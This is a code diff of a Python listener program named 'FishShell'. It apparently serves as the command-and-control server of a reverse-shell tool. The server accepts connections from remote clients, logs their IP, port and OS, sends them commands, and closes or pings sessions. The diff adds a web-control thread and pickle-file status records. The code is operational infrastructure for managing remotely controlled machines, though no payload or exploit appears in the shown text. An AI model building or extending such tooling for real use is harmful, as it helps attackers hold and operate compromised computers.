@@ -2,6 +2,7 @@ import os
 import sys
 import time
 import pickle
+import platform
 import threading
 import traceback
 import subprocess
@@ -23,17 +24,21 @@ except Exception as err:
     print()
 
 
+import sources.functions.getCommand as gc
 import sources.functions.var.globals as g
 from sources.functions.banner import banner
 from sources.functions.help import help_menu
 from sources.functions.generate import generate
 from sources.functions.session import send_command
-from sources.functions.ClearScreen import clear_screen
+from sources.functions.clearScreen import clear_screen
+from sources.functions.web.webSession import web_session
 
 
 def create_threads():
-    global shell_thread, listen_thread
-    shell_thread = threading.Thread(target=call_shell)
+    global shell_thread, listen_thread, web_thread
+    shell_thread = threading.Thread(target=lambda: call_shell())
+    web_thread = threading.Thread(target=lambda: web_handler())
+    web_thread.daemon = True
     listen_thread = threading.Thread(target=lambda: listen())
     listen_thread.daemon = True
 
@@ -41,6 +46,77 @@ def create_threads():
 def call_shell():
     banner()
     shell()
+
+
+def write_info(key: str, status: str):
+    with open(r'WebInterface/TestProject/Templates/Data/info.bin', 'rb+') as info_file:
+        try:
+            info = pickle.load(info_file)
+        except EOFError:
+            info = {}
+        if key == 'all':
+            for k in info:
+                info[k] = None
+        else:
+            info[key] = status
+        info_file.seek(0)
+        pickle.dump(info, info_file)
+        info_file.close()
+
+
+def write_results(key: str, msg: str):
+    with open(r'WebInterface/TestProject/Templates/Data/result.bin', 'rb+') as result_file:
+        try:
+            results = pickle.load(result_file)
+        except EOFError:
+            results = {}
+        results[key] = msg
+        result_file.seek(0)
+        pickle.dump(results, result_file)
+        result_file.close()
+
+
+def write_clients(records: dict):
+    data = []
+    for Id in records:
+        rec = records[Id]
+        cli = {'id': Id, 'ip': rec[1][0], 'port': rec[1][1], 'os': rec[2], 'time': rec[3]}
+        data.append(cli)
+    with open(r'WebInterface/TestProject/Templates/Data/clients.bin', 'wb') as client_file:
+        client_file.seek(0)
+        pickle.dump(data, client_file)
+        client_file.close()
+
+
+def web_handler():
+    global listen_thread, output_buffer
+    while not g.till:
+        try:
+            commands = gc.get_command()
+            for pair in commands:
+                command = pair[0]
+                arguments = pair[1]
+                if command == 'startServer':
+                    g.host = arguments['host']
+                    g.port = arguments['port']
+                    state, msg = start_server()
+                    if state:
+                        g.accept = True
+                        listen_thread.start()
+                        listen_thread = threading.Thread(target=lambda: listen(again=True))
+                    if msg == f"{g.info} Listening on '{g.host}' at port '{g.port}'":
+                        write_results(command, 'SUCCESS')
+                        if g.host == '127.0.0.1' and g.port == 3784:
+                            msg = (f"\n\n'lhost' and 'lport' not set, continuing with default parameters\n{msg}")
+                        output_buffer.append(msg)
+                        release_output_buffer()
+                    else:
+                        msg = msg.replace(f'{g.error} ', '').split('\n')[0]
+                        write_results(command, msg)
+        except EOFError:
+            pass
+        except Exception:
+            print(traceback.format_exc())
 
 
 def listen(again: bool = False):
@@ -66,11 +142,19 @@ def start_server():
         g.server.listen()
         ping.listen()
         msg = f"{g.info} Listening on '{g.host}' at port '{g.port}'"
+        write_info('server', 'running')
         return True, msg
-    except OSError:
-        msg = f"{g.error} Specified port already in use\n{g.fix}    Use 'set --lport <PORT> to set a different port"
-    except Exception as msg:
-        msg = f"{g.error} {msg}"
+    except sock.gaierror:
+        msg = f"{g.error} Failed to get address info"
+    except OSError as error:
+        if error.args[0] == 10048:
+            msg = f"{g.error} Specified port already in use\n{g.fix}    Use 'set --lport <PORT> to set a different port"
+        elif error.args[0] == 10049:
+            msg = f"{g.error} Specified host is not valid\n{g.fix}    Use 'set --lhost <HOST> to set a valid host"
+        else:
+            msg = f"{g.error} {error}"
+    except Exception as error:
+        msg = f"{g.error} {error}"
     g.server = None
     g.accept = False
     return False, msg
@@ -96,6 +180,7 @@ def accept_connections():
             when = datetime.now()
             g.all_conns[Id] = [client, addr, platform, when, None, 'Active']
             g.active_conns[Id] = [client, addr, platform, when, None]
+            write_clients(records=g.active_conns)
             print_msg = f"\n\n{g.info} New Connection!\n{g.info} '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'"
             output_buffer.append(print_msg)
         except Exception as error:
@@ -154,6 +239,7 @@ def send_ping():
                 print_msg = f"\n\n{g.info} Connection closed!\n{g.info} '{str(g.active_conns[Id][1][0])}:{str(g.active_conns[Id][1][1])}', client id '{Id}' has disconnected from the server"
                 output_buffer.append(print_msg)
                 del g.active_conns[Id]
+                write_clients(records=g.active_conns)
             except:
                 pass
         # if isShell:
@@ -277,10 +363,17 @@ def close_connection(Id):
 
 def close_all_connections():
     for Id in g.active_conns:
-        client = g.active_conns[Id][0]
-        client.send(b'start')
-        client.send(b'close')
-        client.close()
+        try:
+            client = g.active_conns[Id][0]
+            client.send(b'start')
+            client.send(b'close')
+            client.close()
+        except sock.timeout:
+            print()
+            print(f"Session '{Id}' may have already died")
+        except Exception as e:
+            print()
+            print(e)
     g.active_conns.clear()
 
 
@@ -294,7 +387,10 @@ def quit_shell():
 
 
 def shell():
-    global cmnd, output_buffer, listen_thread, isShell
+    global cmnd, output_buffer, listen_thread, web_thread, isShell
+    write_info('server', None)
+    write_clients(records={})
+    web_thread.start()
     isShell = True
     while not g.till:
         try:
@@ -302,7 +398,7 @@ def shell():
             cmnd = input(f"{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}")
             if cmnd == 'help':
                 help_menu(command='help')
-            elif 'help' in cmnd or '-h' in cmnd:
+            elif '--help' in cmnd or '-h' in cmnd:
                 help_menu(command=cmnd)
             elif cmnd == 'clear':
                 clear_screen()
@@ -330,7 +426,7 @@ def shell():
                 if g.server is not None:
                     print(f"\n{g.error} Listener can only be started once")
                     continue
-                if g.host == '192.168.29.17' and g.port == 3784:
+                if g.host == '127.0.0.1' and g.port == 3784:
                     print()
                     print("'lhost' and 'lport' not set, continuing with default parameters")
                 state, msg = start_server()
@@ -365,7 +461,7 @@ def shell():
                     print(f"{g.error} No active connections to close")
                     print(f"{g.fix}   Enter 'listen' to start listening for connections")
                     continue
-                if cmnd[6:] == '-id':
+                if cmnd[6:8] == '-id':
                     Id = cmnd[10:]
                     close_connection(Id)
                 elif cmnd[6:] == '-all':
@@ -409,7 +505,7 @@ def shell():
             elif cmnd[:len(cmnd)] == (len(cmnd)*' ') or cmnd == '':
                 pass
             else:
-                help_menu(command='invalid')
+                help_menu(command=cmnd)
         except KeyboardInterrupt:
             print()
             print("Enter 'qs' to exit/quit shell")
@@ -428,6 +524,8 @@ def shell():
             print(f'{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}', end='')
             print([lines for lines in output_buffer][0])
             output_buffer.clear()
+    write_clients(records={})
+    write_info('all', None)
     return
 
 
@@ -453,7 +551,10 @@ def main():
 
 
 if __name__ == '__main__':
-    os.system("cmd /c cls")
+    if platform.system() == 'Windows':
+        subprocess.run('cls', shell=True)
+    else:
+        subprocess.run('clear', shell=True)
     main()
     print()
     input("Press enter to continue...")
